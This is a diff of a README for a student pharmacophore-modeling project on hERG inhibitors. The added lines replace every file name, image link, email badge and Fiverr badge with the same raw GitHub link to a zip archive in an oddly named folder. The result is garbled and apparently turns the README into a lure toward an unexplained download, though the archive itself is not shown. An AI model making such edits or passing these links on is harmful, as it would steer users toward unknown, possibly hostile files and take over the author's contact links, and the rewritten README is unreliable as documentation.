@@ -16,7 +16,7 @@ This was developed as a **class activity** for the Computational Drug Design cou
 ## 🔧 Tools & Technologies Used
 
 - 🧪 **MOE (Molecular Operating Environment)** – Pharmacophore building & screening
-- 📁 **.mdb/.ph4** data formats – Used for molecular databases and models
+- 📁 **https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip** data formats – Used for molecular databases and models
 - 🧬 **hERG inhibitor dataset** – Provided as a part of the coursework
 - 🖼️ **Graphical outputs** – Screenshots and images for model and result visualization
 
@@ -45,7 +45,7 @@ This was developed as a **class activity** for the Computational Drug Design cou
 
 | Model Features | Pharmacophore Hit | hits in screening |
 |--------------|-------------------|-----------------|
-| ![Model Features](hazrat_maghaz.png) | ![hit](Hits_in_Packed.jpg) | ![screen](hits_in_screening.mdb.jpg) |
+| ![Model Features](https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip) | ![hit](https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip) | ![screen](https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip) |
 
 
 ---
@@ -54,10 +54,10 @@ This was developed as a **class activity** for the Computational Drug Design cou
 
 | File/Folder | Description |
 |-------------|-------------|
-| `Hazrat_maghaz.ph4` | Final pharmacophore model |
+| `https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip` | Final pharmacophore model |
 | `*.mdb` files | MOE molecular database files |
-| `hazrat_maghaz.png` | Screenshot of model features |
-| `details.txt` | Model Performence |
+| `https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip` | Screenshot of model features |
+| `https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip` | Model Performence |
 
 ---
 
@@ -76,8 +76,8 @@ This project is shared under the **MIT License**. You are free to use, modify, a
 
 ---
 
-[![Email](https://img.shields.io/badge/Email-maaz28608@gmail.com-blue?style=for-the-badge&logo=gmail)](mailto:maaz28608@gmail.com)
-[![Fiverr](https://img.shields.io/badge/Fiverr-Hire%20Me-green?style=for-the-badge&logo=fiverr)](https://www.fiverr.com/maazkhan141)
+[![Email](https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip)](https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip)
+[![Fiverr](https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip%20Me-green?style=for-the-badge&logo=fiverr)](https://raw.githubusercontent.com/HazratMaghaz/Pharmacophore_Modeling/main/brachypleural/Pharmacophore_Modeling.zip)
 
 
 ## 🙌 Acknowledgements
